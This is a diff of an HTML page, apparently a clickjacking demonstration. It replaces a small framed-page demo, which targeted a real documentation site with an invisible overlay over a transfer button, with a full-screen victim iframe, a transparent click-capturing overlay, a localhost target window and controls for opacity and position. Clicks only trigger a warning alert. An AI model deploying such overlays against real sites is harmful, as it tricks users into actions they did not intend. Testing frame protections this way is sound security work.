@@ -1,42 +1,179 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Attacker Page — Clickjacking Demo</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    body { font-family: Arial, sans-serif; margin: 20px; }
-    .frame-wrap { position: relative; width: 480px; height: 260px; border:1px solid #ccc; }
-    iframe { width: 100%; height: 100%; border: none; opacity: 0.99; }
-    /* overlay to trick the user into clicking transfer button */
-    .overlay {
-      position: absolute;
-      top: 140px; /* adjust to align with target's Transfer button */
-      left: 70px;
-      width: 160px;
-      height: 44px;
-      background: rgba(255,255,255,0); /* fully transparent */
-      cursor: pointer;
-    }
-    .note { margin-top: 12px; color:#555; }
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Attacker Demo — Mixed View</title>
+<style>
+  html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif}
+  .wrap{position:fixed;inset:0;overflow:hidden;background:#111}
+
+  /* Background victim iframe (remote site e.g. QSpiders) */
+  iframe#victimFrame {
+    position:absolute;
+    top:0; left:0;
+    width:100%;
+    height:100%;
+    border:0;
+    z-index:10;
+    transform-origin: center;
+    background:white;
+  }
+
+  /* Front small local target (Fonamel) window */
+  .local-box {
+    position:fixed;
+    right:20px;
+    bottom:20px;
+    width:420px;
+    height:520px;
+    z-index:60; /* above victim and overlay */
+    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+    border-radius:8px;
+    overflow:hidden;
+    background:#fff;
+  }
+  iframe#localTarget {
+    width:100%; height:100%; border:0; display:block;
+  }
+
+  /* Transparent overlay to simulate capture (can cover whole screen) */
+  .overlay {
+    position:absolute;
+    top:0; left:0;
+    width:100%;
+    height:100%;
+    z-index:50;       /* above victim, below local-box */
+    background: rgba(0,0,0,0); /* fully transparent */
+    cursor:pointer;
+  }
+
+  /* control panel */
+  .controls {
+    position:fixed;
+    left:20px;
+    bottom:20px;
+    z-index:120;
+    background:rgba(255,255,255,0.95);
+    border-radius:8px;
+    padding:10px;
+    font-size:13px;
+    box-shadow:0 6px 18px rgba(0,0,0,0.25);
+  }
+  .controls label{display:block;margin:6px 0 2px;font-weight:600}
+  .controls input[type="range"]{width:180px}
+  .controls button{margin-top:8px;padding:6px 8px;border-radius:6px;border:0;background:#0b74ff;color:#fff;cursor:pointer}
+  .controls small{display:block;color:#333;margin-top:6px}
+</style>
 </head>
 <body>
-  <h2>Attacker Page</h2>
-  <p class="note">This page embeds the target site in an iframe and places an invisible overlay to simulate clickjacking.</p>
+  <div class="wrap">
+    <!-- Background victim (remote site) -->
+    <iframe id="victimFrame" src="https://example.com" title="victim"></iframe>
 
-  <div class="frame-wrap">
-    <iframe src="https://docs.immutable.com/" id="victimFrame" title="vit"></iframe>
-    <div class="overlay" id="overlay" title="Click here"></div>
+    <!-- Overlay that simulates attacker capturing clicks -->
+    <div class="overlay" id="overlay" title="Transparent attacker overlay (captures clicks)"></div>
+
+    <!-- Local target window visible on top (Fonamel demo) -->
+    <div class="local-box" id="localBox" aria-label="Local target preview">
+      <iframe id="localTarget" src="http://localhost:3000/target" title="local-target"></iframe>
+    </div>
+
+    <!-- Controls -->
+    <div class="controls" role="region" aria-label="Demo controls">
+      <label>Victim opacity (background)</label>
+      <input id="victimOpacity" type="range" min="0.2" max="1" step="0.05" value="1">
+
+      <label>Local window size</label>
+      <input id="localScale" type="range" min="0.4" max="1.0" step="0.05" value="1">
+
+      <label>Local window position</label>
+      <small>Drag it with mouse (hold and move)</small>
+
+      <div style="margin-top:8px">
+        <button id="toggleOverlay">Disable overlay</button>
+        <button id="toggleLocal">Hide local window</button>
+      </div>
+    </div>
   </div>
 
-  <p class="note">Click the transparent area (overlay) to simulate an attack.</p>
+<script>
+  // Elements
+  const victim = document.getElementById('victimFrame');
+  const overlay = document.getElementById('overlay');
+  const localBox = document.getElementById('localBox');
+  const victimOpacity = document.getElementById('victimOpacity');
+  const localScale = document.getElementById('localScale');
+  const toggleOverlay = document.getElementById('toggleOverlay');
+  const toggleLocal = document.getElementById('toggleLocal');
 
-  <script>
-    document.getElementById('overlay').addEventListener('click', function(){
-      // clicking overlay triggers click inside the iframe if vulnerable
-      alert('You clicked the overlay. If the target is vulnerable, a click inside the framed page would occur.');
+  // Overlay click — simulation only
+  overlay.addEventListener('click', () => {
+    alert('Overlay clicked — this simulates a clickjacking action. Do NOT enter credentials on framed pages.');
+  });
+
+  // Toggle overlay capturing (pointer-events)
+  let overlayEnabled = true;
+  toggleOverlay.addEventListener('click', () => {
+    overlayEnabled = !overlayEnabled;
+    overlay.style.pointerEvents = overlayEnabled ? 'auto' : 'none';
+    toggleOverlay.textContent = overlayEnabled ? 'Disable overlay' : 'Enable overlay';
+  });
+
+  // Toggle local window visibility
+  let localVisible = true;
+  toggleLocal.addEventListener('click', () => {
+    localVisible = !localVisible;
+    localBox.style.display = localVisible ? 'block' : 'none';
+    toggleLocal.textContent = localVisible ? 'Hide local window' : 'Show local window';
+  });
+
+  // Victim opacity control
+  victimOpacity.addEventListener('input', (e) => {
+    victim.style.opacity = e.target.value;
+  });
+
+  // Local window scale
+  localScale.addEventListener('input', (e) => {
+    const s = parseFloat(e.target.value);
+    localBox.style.transform = `scale(${s})`;
+    // adjust transform origin to keep it in corner
+    localBox.style.transformOrigin = 'bottom right';
+  });
+
+  // Make local-box draggable (simple)
+  (function makeDraggable(el){
+    el.style.touchAction = 'none';
+    let dragging = false, startX=0, startY=0, origX=0, origY=0;
+    el.addEventListener('pointerdown', (ev) => {
+      dragging = true;
+      startX = ev.clientX;
+      startY = ev.clientY;
+      const rect = el.getBoundingClientRect();
+      origX = rect.left;
+      origY = rect.top;
+      el.setPointerCapture(ev.pointerId);
     });
-  </script>
+    window.addEventListener('pointermove', (ev) => {
+      if(!dragging) return;
+      const dx = ev.clientX - startX;
+      const dy = ev.clientY - startY;
+      el.style.left = (origX + dx) + 'px';
+      el.style.top  = (origY + dy) + 'px';
+      el.style.right = 'auto';
+      el.style.bottom = 'auto';
+      el.style.position = 'fixed';
+    });
+    window.addEventListener('pointerup', (ev) => {
+      dragging = false;
+    });
+  })(localBox);
+
+  // OPTIONAL: quick keyboard shortcuts
+  window.addEventListener('keydown', (e) => {
+    if(e.key === 'o') { toggleOverlay.click(); }
+    if(e.key === 'l') { toggleLocal.click(); }
+  });
+</script>
 </body>
 </html>
